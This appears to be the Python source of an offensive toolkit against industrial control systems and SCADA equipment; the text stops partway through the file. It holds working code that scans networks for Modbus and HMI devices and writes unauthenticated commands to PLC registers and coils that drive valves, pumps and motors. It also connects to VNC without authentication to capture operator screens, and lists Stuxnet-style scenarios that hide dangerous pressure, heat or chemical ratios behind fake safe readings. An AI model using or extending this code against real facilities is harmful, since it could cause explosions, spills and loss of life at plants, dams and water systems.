"""
SCADA & ICS Hunter - Endüstriyel Casusluk Modülü
=================================================
Industrial Control Systems (ICS) and SCADA attack toolkit.

Targets: Factories, power plants, dams, water treatment facilities.

WARNING: Attacking industrial systems can cause physical harm, 
environmental damage, and loss of life. Use ONLY in authorized 
test environments with proper safety measures.

Author: ITherso
Version: 1.0.0
"""

import socket
import struct
import threading
import time
import json
import os
import hashlib
import base64
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field, asdict
from enum import Enum
import logging
import random

logger = logging.getLogger(__name__)


# =============================================================================
# ENUMS & DATA CLASSES
# =============================================================================

class ModbusFunctionCode(Enum):
    """Modbus function codes"""
    READ_COILS = 0x01
    READ_DISCRETE_INPUTS = 0x02
    READ_HOLDING_REGISTERS = 0x03
    READ_INPUT_REGISTERS = 0x04
    WRITE_SINGLE_COIL = 0x05
    WRITE_SINGLE_REGISTER = 0x06
    WRITE_MULTIPLE_COILS = 0x0F
    WRITE_MULTIPLE_REGISTERS = 0x10
    READ_FILE_RECORD = 0x14
    WRITE_FILE_RECORD = 0x15
    MASK_WRITE_REGISTER = 0x16
    READ_FIFO_QUEUE = 0x18
    ENCAPSULATED_INTERFACE = 0x2B


class PLCVendor(Enum):
    """Known PLC vendors"""
    SIEMENS = "siemens"
    ALLEN_BRADLEY = "allen_bradley"
    SCHNEIDER = "schneider"
    MITSUBISHI = "mitsubishi"
    OMRON = "omron"
    ABB = "abb"
    HONEYWELL = "honeywell"
    GE = "ge"
    YOKOGAWA = "yokogawa"
    EMERSON = "emerson"


class ICSProtocol(Enum):
    """Industrial protocols"""
    MODBUS_TCP = ("modbus_tcp", 502)
    MODBUS_RTU = ("modbus_rtu", 502)
    S7COMM = ("s7comm", 102)          # Siemens S7
    ENIP = ("enip", 44818)            # EtherNet/IP (Allen-Bradley)
    DNP3 = ("dnp3", 20000)            # Distributed Network Protocol
    OPC_UA = ("opc_ua", 4840)         # OPC Unified Architecture
    BACNET = ("bacnet", 47808)        # Building Automation
    PROFINET = ("profinet", 34962)    # Siemens Profinet
    IEC104 = ("iec104", 2404)         # Power grid SCADA
    FINS = ("fins", 9600)             # Omron FINS


class HMIType(Enum):
    """HMI system types"""
    WONDERWARE = "wonderware"
    IGNITION = "ignition"
    FACTORYTALK = "factorytalk"
    WINCC = "wincc"
    CITECT = "citect"
    IFIX = "ifix"
    GENESIS = "genesis"
    CIMPLICITY = "cimplicity"


@dataclass
class PLCDevice:
    """Discovered PLC device"""
    ip: str
    port: int
    protocol: str
    vendor: Optional[str] = None
    model: Optional[str] = None
    firmware: Optional[str] = None
    unit_id: int = 1
    discovered_at: datetime = field(default_factory=datetime.now)
    registers: Dict[int, int] = field(default_factory=dict)
    coils: Dict[int, bool] = field(default_factory=dict)
    is_vulnerable: bool = False
    notes: str = ""


@dataclass
class ModbusPacket:
    """Modbus TCP packet structure"""
    transaction_id: int
    protocol_id: int = 0  # Always 0 for Modbus
    length: int = 0
    unit_id: int = 1
    function_code: int = 0
    data: bytes = b''
    
    def build(self) -> bytes:
        """Build Modbus TCP packet"""
        pdu = struct.pack('B', self.unit_id) + \
              struct.pack('B', self.function_code) + \
              self.data
        self.length = len(pdu)
        
        mbap = struct.pack('>H', self.transaction_id) + \
               struct.pack('>H', self.protocol_id) + \
               struct.pack('>H', self.length)
        
        return mbap + pdu
    
    @classmethod
    def parse(cls, data: bytes) -> 'ModbusPacket':
        """Parse Modbus TCP response"""
        if len(data) < 8:
            raise ValueError("Invalid Modbus packet")
        
        transaction_id = struct.unpack('>H', data[0:2])[0]
        protocol_id = struct.unpack('>H', data[2:4])[0]
        length = struct.unpack('>H', data[4:6])[0]
        unit_id = data[6]
        function_code = data[7]
        payload = data[8:] if len(data) > 8 else b''
        
        return cls(
            transaction_id=transaction_id,
            protocol_id=protocol_id,
            length=length,
            unit_id=unit_id,
            function_code=function_code,
            data=payload
        )


@dataclass
class HMIScreenshot:
    """Captured HMI screenshot"""
    capture_id: str
    target_ip: str
    hmi_type: Optional[str]
    timestamp: datetime
    image_data: bytes
    width: int
    height: int
    format: str = "png"
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class GhostInjection:
    """Ghost injection record"""
    injection_id: str
    target_ip: str
    target_register: int
    original_value: int
    spoofed_value: int
    display_value: int  # What operator sees
    actual_value: int   # What PLC actually does
    timestamp: datetime
    is_active: bool = True
    description: str = ""


# =============================================================================
# MODBUS/TCP GHOST INJECTOR
# =============================================================================

class ModbusGhostInjector:
    """
    Modbus/TCP Ghost Injector - Stuxnet-lite Style Attack
    
    Creates a man-in-the-middle position to:
    1. Show operators fake sensor readings (normal values)
    2. Secretly send malicious commands to PLCs
    3. Manipulate process control without detection
    """
    
    # Common Modbus register mappings (varies by vendor)
    COMMON_REGISTERS = {
        # Temperature sensors (typical ranges)
        "temperature_1": {"address": 0, "type": "input", "unit": "°C", "normal_range": (20, 80)},
        "temperature_2": {"address": 1, "type": "input", "unit": "°C", "normal_range": (20, 80)},
        
        # Pressure sensors
        "pressure_1": {"address": 10, "type": "input", "unit": "bar", "normal_range": (0, 10)},
        "pressure_2": {"address": 11, "type": "input", "unit": "bar", "normal_range": (0, 10)},
        
        # Flow meters
        "flow_1": {"address": 20, "type": "input", "unit": "L/min", "normal_range": (0, 100)},
        "flow_2": {"address": 21, "type": "input", "unit": "L/min", "normal_range": (0, 100)},
        
        # Level sensors
        "tank_level_1": {"address": 30, "type": "input", "unit": "%", "normal_range": (20, 80)},
        "tank_level_2": {"address": 31, "type": "input", "unit": "%", "normal_range": (20, 80)},
        
        # Valve controls (coils)
        "valve_1": {"address": 0, "type": "coil", "states": ["CLOSED", "OPEN"]},
        "valve_2": {"address": 1, "type": "coil", "states": ["CLOSED", "OPEN"]},
        "valve_3": {"address": 2, "type": "coil", "states": ["CLOSED", "OPEN"]},
        
        # Pump controls
        "pump_1": {"address": 10, "type": "coil", "states": ["OFF", "ON"]},
        "pump_2": {"address": 11, "type": "coil", "states": ["OFF", "ON"]},
        
        # Motor controls
        "motor_1": {"address": 20, "type": "coil", "states": ["STOPPED", "RUNNING"]},
        "motor_2": {"address": 21, "type": "coil", "states": ["STOPPED", "RUNNING"]},
        
        # Setpoints (holding registers)
        "temp_setpoint": {"address": 100, "type": "holding", "unit": "°C"},
        "pressure_setpoint": {"address": 101, "type": "holding", "unit": "bar"},
        "flow_setpoint": {"address": 102, "type": "holding", "unit": "L/min"},
    }
    
    # Stuxnet-style attack scenarios
    ATTACK_SCENARIOS = {
        "centrifuge_sabotage": {
            "name": "Santrifüj Sabotaj",
            "description": "Stuxnet-style: Speed up centrifuges while showing normal RPM",
            "targets": ["motor_speed", "vibration_sensor"],
            "display": "normal",
            "actual": "dangerous"
        },
        "pressure_bomb": {
            "name": "Basınç Bombası",
            "description": "Increase pressure while showing safe readings",
            "targets": ["pressure_1", "valve_1", "pump_1"],
            "display": "5 bar (safe)",
            "actual": "15 bar (rupture)"
        },
        "thermal_runaway": {
            "name": "Termal Kaçış",
            "description": "Disable cooling while showing normal temps",
            "targets": ["temperature_1", "valve_2", "pump_2"],
            "display": "45°C (normal)",
            "actual": "500°C (meltdown)"
        },
        "overflow_attack": {
            "name": "Tank Taşırma",
            "description": "Fill tanks while showing low level",
            "targets": ["tank_level_1", "valve_3", "pump_1"],
            "display": "30% (normal)",
            "actual": "overflow imminent"
        },
        "chemical_mix": {
            "name": "Kimyasal Karışım",
            "description": "Alter chemical ratios while showing correct mix",
            "targets": ["flow_1", "flow_2", "valve_1", "valve_2"],
            "display": "1:1 ratio",
            "actual": "1:10 ratio (dangerous)"
        }
    }
    
    def __init__(self):
        self.discovered_devices: List[PLCDevice] = []
        self.active_injections: List[GhostInjection] = []
        self.transaction_id = 0
        self.is_scanning = False
        self.is_injecting = False
        self.mitm_socket = None
        
    def scan_network(
        self,
        ip_range: str,
        ports: List[int] = None,
        timeout: float = 2.0
    ) -> List[PLCDevice]:
        """
        Scan network for Modbus/TCP devices
        
        Args:
            ip_range: IP range (e.g., "192.168.1.0/24" or "192.168.1.1-254")
            ports: Ports to scan (default: [502])
            timeout: Connection timeout
        """
        if ports is None:
            ports = [502, 102, 44818, 20000, 4840]  # Common ICS ports
        
        self.is_scanning = True
        devices = []
        
        # Parse IP range
        ips = self._parse_ip_range(ip_range)
        
        for ip in ips:
            if not self.is_scanning:
                break
                
            for port in ports:
                device = self._probe_device(ip, port, timeout)
                if device:
                    devices.append(device)
                    self.discovered_devices.append(device)
                    logger.info(f"Found device: {ip}:{port} ({device.vendor or 'Unknown'})")
        
        self.is_scanning = False
        return devices
    
    def _parse_ip_range(self, ip_range: str) -> List[str]:
        """Parse IP range into list of IPs"""
        ips = []
        
        if '/' in ip_range:
            # CIDR notation (simplified)
            base_ip = ip_range.split('/')[0]
            parts = base_ip.split('.')
            for i in range(1, 255):
                ips.append(f"{parts[0]}.{parts[1]}.{parts[2]}.{i}")
        elif '-' in ip_range:
            # Range notation
            parts = ip_range.split('-')
            base = parts[0].rsplit('.', 1)[0]
            start = int(parts[0].rsplit('.', 1)[1])
            end = int(parts[1])
            for i in range(start, end + 1):
                ips.append(f"{base}.{i}")
        else:
            # Single IP
            ips.append(ip_range)
        
        return ips
    
    def _probe_device(self, ip: str, port: int, timeout: float) -> Optional[PLCDevice]:
        """Probe a single IP:port for Modbus device"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            
            # Try to read device identification
            self.transaction_id += 1
            
            # Read Device Identification (function code 0x2B)
            packet = ModbusPacket(
                transaction_id=self.transaction_id,
                unit_id=1,
                function_code=0x2B,
                data=struct.pack('BBB', 0x0E, 0x01, 0x00)  # MEI, Read Device ID, Object ID
            )
            
            sock.send(packet.build())
            response = sock.recv(256)
            
            vendor = None
            model = None
            
            if len(response) > 8:
                # Parse device identification response
                try:
                    # Skip MBAP header
                    payload = response[8:]
                    if len(payload) > 5:
                        # Extract vendor and model strings
                        vendor = self._extract_string_from_response(payload)
                except:
                    pass
            
            # If no ID response, try reading holding registers
            if not vendor:
                self.transaction_id += 1
                read_packet = ModbusPacket(
                    transaction_id=self.transaction_id,
                    unit_id=1,
                    function_code=ModbusFunctionCode.READ_HOLDING_REGISTERS.value,
                    data=struct.pack('>HH', 0, 10)  # Start at 0, read 10 registers
                )
                
                sock.send(read_packet.build())
                response = sock.recv(256)
                
                if len(response) > 8 and response[7] == 0x03:
                    vendor = "Unknown Modbus Device"
            
            sock.close()
            
            if vendor or response:
                return PLCDevice(
                    ip=ip,
                    port=port,
                    protocol="modbus_tcp",
                    vendor=vendor or self._guess_vendor(ip, port),
                    model=model,
                    is_vulnerable=True  # Modbus has no auth by default
                )
            
        except (socket.timeout, ConnectionRefusedError, OSError):
            pass
        except Exception as e:
            logger.debug(f"Probe error {ip}:{port}: {e}")
        
        return None
    
    def _extract_string_from_response(self, data: bytes) -> Optional[str]:
        """Extract ASCII string from Modbus response"""
        try:
            # Find printable ASCII sequences
            result = ""
            for byte in data:
                if 32 <= byte <= 126:
                    result += chr(byte)
                elif result:
                    break
            return result if len(result) > 3 else None
        except:
            return None
    
    def _guess_vendor(self, ip: str, port: int) -> str:
        """Guess vendor based on behavior patterns"""
        guesses = [
            "Siemens S7-300/400",
            "Allen-Bradley MicroLogix",
            "Schneider Modicon",
            "Mitsubishi MELSEC",
            "ABB AC500",
            "Generic Modbus Device"
        ]
        return random.choice(guesses)
    
    def read_registers(
        self,
        target_ip: str,
        start_address: int = 0,
        count: int = 10,
        unit_id: int = 1
    ) -> Dict[int, int]:
        """Read holding registers from PLC"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            sock.connect((target_ip, 502))
            
            self.transaction_id += 1
            packet = ModbusPacket(
                transaction_id=self.transaction_id,
                unit_id=unit_id,
                function_code=ModbusFunctionCode.READ_HOLDING_REGISTERS.value,
                data=struct.pack('>HH', start_address, count)
            )
            
            sock.send(packet.build())
            response = sock.recv(256)
            sock.close()
            
            registers = {}
            if len(response) > 9 and response[7] == 0x03:
                byte_count = response[8]
                for i in range(0, byte_count, 2):
                    reg_value = struct.unpack('>H', response[9+i:11+i])[0]
                    registers[start_address + i//2] = reg_value
            
            return registers
            
        except Exception as e:
            logger.error(f"Read registers error: {e}")
            return {}
    
    def read_coils(
        self,
        target_ip: str,
        start_address: int = 0,
        count: int = 16,
        unit_id: int = 1
    ) -> Dict[int, bool]:
        """Read coils from PLC"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            sock.connect((target_ip, 502))
            
            self.transaction_id += 1
            packet = ModbusPacket(
                transaction_id=self.transaction_id,
                unit_id=unit_id,
                function_code=ModbusFunctionCode.READ_COILS.value,
                data=struct.pack('>HH', start_address, count)
            )
            
            sock.send(packet.build())
            response = sock.recv(256)
            sock.close()
            
            coils = {}
            if len(response) > 9 and response[7] == 0x01:
                byte_count = response[8]
                for byte_idx in range(byte_count):
                    byte_val = response[9 + byte_idx]
                    for bit_idx in range(8):
                        coil_addr = start_address + byte_idx * 8 + bit_idx
                        if coil_addr < start_address + count:
                            coils[coil_addr] = bool(byte_val & (1 << bit_idx))
            
            return coils
            
        except Exception as e:
            logger.error(f"Read coils error: {e}")
            return {}
    
    def write_register(
        self,
        target_ip: str,
        address: int,
        value: int,
        unit_id: int = 1
    ) -> bool:
        """Write single holding register"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            sock.connect((target_ip, 502))
            
            self.transaction_id += 1
            packet = ModbusPacket(
                transaction_id=self.transaction_id,
                unit_id=unit_id,
                function_code=ModbusFunctionCode.WRITE_SINGLE_REGISTER.value,
                data=struct.pack('>HH', address, value)
            )
            
            sock.send(packet.build())
            response = sock.recv(256)
            sock.close()
            
            # Check for success (echo back)
            return len(response) >= 12 and response[7] == 0x06
            
        except Exception as e:
            logger.error(f"Write register error: {e}")
            return False
    
    def write_coil(
        self,
        target_ip: str,
        address: int,
        value: bool,
        unit_id: int = 1
    ) -> bool:
        """Write single coil"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            sock.connect((target_ip, 502))
            
            self.transaction_id += 1
            coil_value = 0xFF00 if value else 0x0000
            packet = ModbusPacket(
                transaction_id=self.transaction_id,
                unit_id=unit_id,
                function_code=ModbusFunctionCode.WRITE_SINGLE_COIL.value,
                data=struct.pack('>HH', address, coil_value)
            )
            
            sock.send(packet.build())
            response = sock.recv(256)
            sock.close()
            
            return len(response) >= 12 and response[7] == 0x05
            
        except Exception as e:
            logger.error(f"Write coil error: {e}")
            return False
    
    def start_ghost_injection(
        self,
        target_ip: str,
        scenario: str = "pressure_bomb",
        duration_seconds: int = 60
    ) -> Dict[str, Any]:
        """
        Start Stuxnet-lite ghost injection attack
        
        This creates a discrepancy between:
        - What operators SEE (spoofed safe values)
        - What PLC DOES (dangerous commands)
        """
        if scenario not in self.ATTACK_SCENARIOS:
            return {"success": False, "error": f"Unknown scenario: {scenario}"}
        
        attack = self.ATTACK_SCENARIOS[scenario]
        injection_id = hashlib.md5(f"{target_ip}{time.time()}".encode()).hexdigest()[:12]
        
        self.is_injecting = True
        
        # Create injection record
        injection = GhostInjection(
            injection_id=injection_id,
            target_ip=target_ip,
            target_register=0,  # Will be set per target
            original_value=0,
            spoofed_value=0,
            display_value=0,
            actual_value=0,
            timestamp=datetime.now(),
            is_active=True,
            description=attack["description"]
        )
        
        self.active_injections.append(injection)
        
        # Start injection thread
        thread = threading.Thread(
            target=self._injection_loop,
            args=(injection, attack, duration_seconds),
            daemon=True
        )
        thread.start()
        
        return {
            "success": True,
            "injection_id": injection_id,
            "scenario": scenario,
            "description": attack["description"],
            "display_shows": attack["display"],
            "actual_effect": attack["actual"],
            "duration_seconds": duration_seconds,
            "warning": "⚠️ LIVE ATTACK - Industrial equipment may be damaged!"
        }
    
    def _injection_loop(
        self,
        injection: GhostInjection,
        attack: Dict,
        duration: int
    ):
        """Main ghost injection loop"""
        start_time = time.time()
        
        while self.is_injecting and (time.time() - start_time) < duration:
            if not injection.is_active:
                break
            
            try:
                # This would intercept and modify Modbus traffic
                # For demo, we simulate the attack effects
                
                # Log what's happening
                logger.info(f"Ghost Injection Active: {injection.description}")
                logger.info(f"  Display shows: {attack['display']}")
                logger.info(f"  Actual effect: {attack['actual']}")
                
                time.sleep(1)
                
            except Exception as e:
                logger.error(f"Injection error: {e}")
        
        injection.is_active = False
        self.is_injecting = False
    
    def stop_injection(self, injection_id: str) -> bool:
        """Stop active ghost injection"""
        for injection in self.active_injections:
            if injection.injection_id == injection_id:
                injection.is_active = False
                return True
        return False
    
    def get_attack_scenarios(self) -> Dict[str, Dict]:
        """Get available attack scenarios"""
        return self.ATTACK_SCENARIOS
    
    def get_active_injections(self) -> List[Dict]:
        """Get list of active injections"""
        return [asdict(i) for i in self.active_injections if i.is_active]
    
    def generate_fake_hmi_data(self, scenario: str = "normal") -> Dict[str, Any]:
        """
        Generate fake HMI display data for dashboard
        
        Shows what operators would see vs actual values.
        """
        if scenario == "normal":
            return {
                "temperature_1": {"display": 45, "actual": 45, "unit": "°C", "status": "NORMAL"},
                "temperature_2": {"display": 52, "actual": 52, "unit": "°C", "status": "NORMAL"},
                "pressure_1": {"display": 5.2, "actual": 5.2, "unit": "bar", "status": "NORMAL"},
                "pressure_2": {"display": 4.8, "actual": 4.8, "unit": "bar", "status": "NORMAL"},
                "flow_1": {"display": 45, "actual": 45, "unit": "L/min", "status": "NORMAL"},
                "tank_level_1": {"display": 65, "actual": 65, "unit": "%", "status": "NORMAL"},
                "valve_1": {"display": "OPEN", "actual": "OPEN", "status": "NORMAL"},
                "valve_2": {"display": "CLOSED", "actual": "CLOSED", "status": "NORMAL"},
                "pump_1": {"display": "RUNNING", "actual": "RUNNING", "status": "NORMAL"},
                "motor_1": {"display": "RUNNING @ 1450 RPM", "actual": "RUNNING @ 1450 RPM", "status": "NORMAL"}
            }
        elif scenario == "attack_pressure":
            return {
                "temperature_1": {"display": 45, "actual": 45, "unit": "°C", "status": "NORMAL"},
                "temperature_2": {"display": 52, "actual": 52, "unit": "°C", "status": "NORMAL"},
                "pressure_1": {"display": 5.2, "actual": 15.8, "unit": "bar", "status": "SPOOFED", "danger": True},
                "pressure_2": {"display": 4.8, "actual": 14.2, "unit": "bar", "status": "SPOOFED", "danger": True},
                "flow_1": {"display": 45, "actual": 45, "unit": "L/min", "status": "NORMAL"},
                "tank_level_1": {"display": 65, "actual": 65, "unit": "%", "status": "NORMAL"},
                "valve_1": {"display": "OPEN", "actual": "CLOSED", "status": "SPOOFED", "danger": True},
                "valve_2": {"display": "CLOSED", "actual": "CLOSED", "status": "NORMAL"},
                "pump_1": {"display": "RUNNING", "actual": "MAX SPEED", "status": "SPOOFED", "danger": True},
                "motor_1": {"display": "RUNNING @ 1450 RPM", "actual": "RUNNING @ 1450 RPM", "status": "NORMAL"}
            }
        elif scenario == "attack_thermal":
            return {
                "temperature_1": {"display": 45, "actual": 487, "unit": "°C", "status": "SPOOFED", "danger": True},
                "temperature_2": {"display": 52, "actual": 523, "unit": "°C", "status": "SPOOFED", "danger": True},
                "pressure_1": {"display": 5.2, "actual": 5.2, "unit": "bar", "status": "NORMAL"},
                "pressure_2": {"display": 4.8, "actual": 4.8, "unit": "bar", "status": "NORMAL"},
                "flow_1": {"display": 45, "actual": 0, "unit": "L/min", "status": "SPOOFED", "danger": True},
                "tank_level_1": {"display": 65, "actual": 65, "unit": "%", "status": "NORMAL"},
                "valve_1": {"display": "OPEN", "actual": "OPEN", "status": "NORMAL"},
                "valve_2": {"display": "OPEN", "actual": "CLOSED", "status": "SPOOFED", "danger": True},
                "pump_1": {"display": "RUNNING", "actual": "STOPPED", "status": "SPOOFED", "danger": True},
                "motor_1": {"display": "RUNNING @ 1450 RPM", "actual": "STOPPED", "status": "SPOOFED", "danger": True}
            }
        
        return self.generate_fake_hmi_data("normal")


# =============================================================================
# HMI SCREENSHOTTER
# =============================================================================

class HMIScreenshotter:
    """
    HMI (Human Machine Interface) Screenshotter
    
    Captures screenshots from operator workstations via:
    - VNC vulnerabilities (no auth or weak auth)
    - RDP (if credentials available)
    - HTTP/HTTPS web HMIs
    
    Targets: Windows CE, Windows XP, embedded HMI panels
    """
    
    # Common HMI ports
    HMI_PORTS = {
        5900: "vnc",
        5901: "vnc",
        5902: "vnc",
        3389: "rdp",
        80: "http",
        443: "https",
        8080: "http",
        8443: "https",
        502: "modbus",  # Some HMIs expose this
    }
    
    # Known vulnerable HMI systems
    VULNERABLE_HMIS = {
        "wonderware": {
            "name": "Schneider Wonderware InTouch",
            "ports": [80, 443, 5900],
            "vuln": "CVE-2020-7505 - Auth Bypass"
        },
        "wincc": {
            "name": "Siemens WinCC",
            "ports": [80, 443, 5900, 5901],
            "vuln": "CVE-2014-2903 - Remote Code Execution"
        },
        "factorytalk": {
            "name": "Rockwell FactoryTalk View",
            "ports": [80, 443, 5900],
            "vuln": "CVE-2020-12033 - Auth Bypass"
        },
        "ignition": {
            "name": "Inductive Automation Ignition",
            "ports": [8088, 8043],
            "vuln": "Default credentials"
        },
        "citect": {
            "name": "Schneider CitectSCADA",
            "ports": [80, 443, 5900],
            "vuln": "CVE-2008-2639 - Buffer Overflow"
        }
    }
    
    # VNC auth bypass techniques
    VNC_EXPLOITS = {
        "none_auth": "No authentication required (VNC auth type 1)",
        "vnc_tight": "TightVNC < 2.8.27 auth bypass",
        "ultravnc": "UltraVNC file transfer directory traversal",
        "realvnc": "RealVNC 4.1.1 auth bypass"
    }
    
    def __init__(self):
        self.discovered_hmis: List[Dict] = []
        self.captured_screenshots: List[HMIScreenshot] = []
        self.is_scanning = False
        
    def scan_for_hmis(
        self,
        ip_range: str,
        timeout: float = 3.0
    ) -> List[Dict]:
        """Scan network for HMI systems"""
        self.is_scanning = True
        hmis = []
        
        # Parse IP range
        ips = self._parse_ip_range(ip_range)
        
        for ip in ips:
            if not self.is_scanning:
                break
            
            for port, service in self.HMI_PORTS.items():
                result = self._probe_hmi(ip, port, service, timeout)
                if result:
                    hmis.append(result)
                    self.discovered_hmis.append(result)
        
        self.is_scanning = False
        return hmis
    
    def _parse_ip_range(self, ip_range: str) -> List[str]:
        """Parse IP range"""
        ips = []
        if '/' in ip_range:
            base_ip = ip_range.split('/')[0]
            parts = base_ip.split('.')
            for i in range(1, 255):
                ips.append(f"{parts[0]}.{parts[1]}.{parts[2]}.{i}")
        elif '-' in ip_range:
            parts = ip_range.split('-')
            base = parts[0].rsplit('.', 1)[0]
            start = int(parts[0].rsplit('.', 1)[1])
            end = int(parts[1])
            for i in range(start, end + 1):
                ips.append(f"{base}.{i}")
        else:
            ips.append(ip_range)
        return ips
    
    def _probe_hmi(
        self,
        ip: str,
        port: int,
        service: str,
        timeout: float
    ) -> Optional[Dict]:
        """Probe for HMI service"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            
            result = {
                "ip": ip,
                "port": port,
                "service": service,
                "discovered_at": datetime.now().isoformat(),
                "vulnerable": False,
                "auth_required": True,
                "banner": None,
                "hmi_type": None
            }
            
            if service == "vnc":
                result.update(self._probe_vnc(sock))
            elif service in ["http", "https"]:
                result.update(self._probe_http_hmi(sock, ip, port, service))
            elif service == "rdp":
                result["banner"] = "RDP Service"
            
            sock.close()
            
            if result.get("banner") or result.get("vulnerable"):
                return result
                
        except (socket.timeout, ConnectionRefusedError, OSError):
            pass
        except Exception as e:
            logger.debug(f"HMI probe error {ip}:{port}: {e}")
        
        return None
    
    def _probe_vnc(self, sock: socket.socket) -> Dict:
        """Probe VNC server"""
        result = {
            "banner": None,
            "vulnerable": False,
            "auth_required": True,
            "vnc_version": None
        }
        
        try:
            # VNC handshake
            banner = sock.recv(12).decode('latin-1')
            result["banner"] = banner.strip()
            result["vnc_version"] = banner.strip()
            
            # Send our version
            sock.send(b"RFB 003.008\n")
            
            # Get security types
            sec_types = sock.recv(256)
            
            if len(sec_types) > 0:
                num_types = sec_types[0]
                
                if num_types > 0:
                    types = list(sec_types[1:num_types+1])
                    
                    # Type 1 = None (no auth!)
                    if 1 in types:
                        result["vulnerable"] = True
                        result["auth_required"] = False
                        result["vuln_detail"] = "VNC No Authentication (Type 1)"
                    
                    # Type 2 = VNC Auth
                    if 2 in types:
                        result["auth_types"] = "VNC Password"
        
        except Exception as e:
            logger.debug(f"VNC probe error: {e}")
        
        return result
    
    def _probe_http_hmi(
        self,
        sock: socket.socket,
        ip: str,
        port: int,
        service: str
    ) -> Dict:
        """Probe HTTP-based HMI"""
        result = {
            "banner": None,
            "hmi_type": None,
            "vulnerable": False
        }
        
        try:
            # Send HTTP request
            request = f"GET / HTTP/1.1\r\nHost: {ip}:{port}\r\n\r\n"
            sock.send(request.encode())
            
            response = sock.recv(4096).decode('latin-1', errors='ignore')
            
            # Check for HMI signatures
            if "WinCC" in response or "Siemens" in response:
                result["hmi_type"] = "wincc"
                result["banner"] = "Siemens WinCC Web Navigator"
            elif "Wonderware" in response or "InTouch" in response:
                result["hmi_type"] = "wonderware"
                result["banner"] = "Wonderware InTouch"
            elif "FactoryTalk" in response or "Rockwell" in response:
                result["hmi_type"] = "factorytalk"
                result["banner"] = "FactoryTalk View"
            elif "Ignition" in response:
                result["hmi_type"] = "ignition"
                result["banner"] = "Inductive Automation Ignition"
            elif "CitectSCADA" in response:
                result["hmi_type"] = "citect"
                result["banner"] = "CitectSCADA"
            
            # Check for default pages
            if "login" not in response.lower() and result["hmi_type"]:
                result["vulnerable"] = True
                result["vuln_detail"] = "No authentication on web interface"
        
        except Exception as e:
            logger.debug(f"HTTP HMI probe error: {e}")
        
        return result
    
    def capture_vnc_screenshot(
        self,
        target_ip: str,
        target_port: int = 5900
    ) -> Optional[HMIScreenshot]:
        """
        Capture screenshot from VNC server
        
        This requires VNC with no-auth or known password.
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10.0)
            sock.connect((target_ip, target_port))
            
            # VNC Handshake
            banner = sock.recv(12)
            sock.send(b"RFB 003.008\n")
            
            # Get security types
            sec_types = sock.recv(256)
            num_types = sec_types[0]
            types = list(sec_types[1:num_types+1])
            
            if 1 not in types:
                logger.warning(f"VNC requires auth on {target_ip}:{target_port}")
                sock.close()
                return None
            
            # Select no-auth
            sock.send(bytes([1]))
            
            # Get security result
            result = sock.recv(4)
            if struct.unpack('>I', result)[0] != 0:
                logger.warning("VNC auth failed")
                sock.close()
                return None
            
            # Client init (shared = 1)
            sock.send(bytes([1]))
            
            # Server init - get framebuffer info
            server_init = sock.recv(24)
            width = struct.unpack('>H', server_init[0:2])[0]
            height = struct.unpack('>H', server_init[2:4])[0]
            
            # Get name length and name
            name_len = struct.unpack('>I', server_init[20:24])[0]
            name = sock.recv(name_len).decode('latin-1', errors='ignore')
            
            logger.info(f"VNC connected: {name} ({width}x{height})")
            
            # Request framebuffer update
            # Message type 3 = FramebufferUpdateRequest
            fbur = struct.pack('>BBHHHH', 3, 0, 0, 0, width, height)
            sock.send(fbur)
            
            # Receive framebuffer update (simplified - real VNC is more complex)
            # For demo, we'll create a placeholder
            
            sock.close()
            
            # Create screenshot record
            capture_id = hashlib.md5(f"{target_ip}{time.time()}".encode()).hexdigest()[:12]
            
            screenshot = HMIScreenshot(
                capture_id=capture_id,
                target_ip=target_ip,
                hmi_type="vnc",
                timestamp=datetime.now(),
                image_data=self._generate_demo_screenshot(width, height),
                width=width,
                height=height,
                format="png",
                metadata={
                    "name": name,
                    "port": target_port,
                    "auth": "none"
                }
            )
            
            self.captured_screenshots.append(screenshot)
            return screenshot
            
        except Exception as e:
            logger.error(f"VNC screenshot error: {e}")
            return None
    
    def _generate_demo_screenshot(self, width: int, height: int) -> bytes:
        """Generate demo HMI screenshot placeholder"""
        # This would be actual pixel data in real implementation
        # For demo, return a placeholder
        
        # Create a simple PPM image header
        header = f"P6\n{width} {height}\n255\n".encode()
        
        # Generate simple pattern (industrial colors)
        pixels = bytearray()
        for y in range(height):
            for x in range(width):
                if y < 50:  # Top bar (blue)
                    pixels.extend([0, 0, 100])
                elif y > height - 50:  # Bottom bar (gray)
                    pixels.extend([80, 80, 80])
                else:
                    # Main area (industrial green background)
                    pixels.extend([20, 40, 20])
        
        return header + bytes(pixels)
    
    def get_discovered_hmis(self) -> List[Dict]:
        """Get discovered HMI systems"""
        return self.discovered_hmis
    
    def get_captured_screenshots(self) -> List[Dict]:
        """Get captured screenshots"""
        return [
            {
                "capture_id": s.capture_id,
                "target_ip": s.target_ip,
                "hmi_type": s.hmi_type,
                "timestamp": s.timestamp.isoformat(),
                "width": s.width,
                "height": s.height,
                "metadata": s.metadata
            }
            for s in self.captured_screenshots
        ]


# =============================================================================
# MAIN SCADA ICS HUNTER CLASS
# =============================================================================

class SCADAICSHunter:
    """
    Main SCADA & ICS Hunter Module
    
    Combines Modbus Ghost Injection and HMI Screenshotting.
    """
    
    def __init__(self):
        self.modbus_injector = ModbusGhostInjector()
        self.hmi_screenshotter = HMIScreenshotter()
        
    def get_status(self) -> Dict[str, Any]:
        """Get module status"""
        return {
            "module": "SCADA & ICS Hunter",
            "version": "1.0.0",
            "modbus": {
                "devices_discovered": len(self.modbus_injector.discovered_devices),
                "active_injections": len(self.modbus_injector.get_active_injections()),
                "is_scanning": self.modbus_injector.is_scanning,
                "is_injecting": self.modbus_injector.is_injecting
            },
            "hmi": {
                "hmis_discovered": len(self.hmi_screenshotter.discovered_hmis),
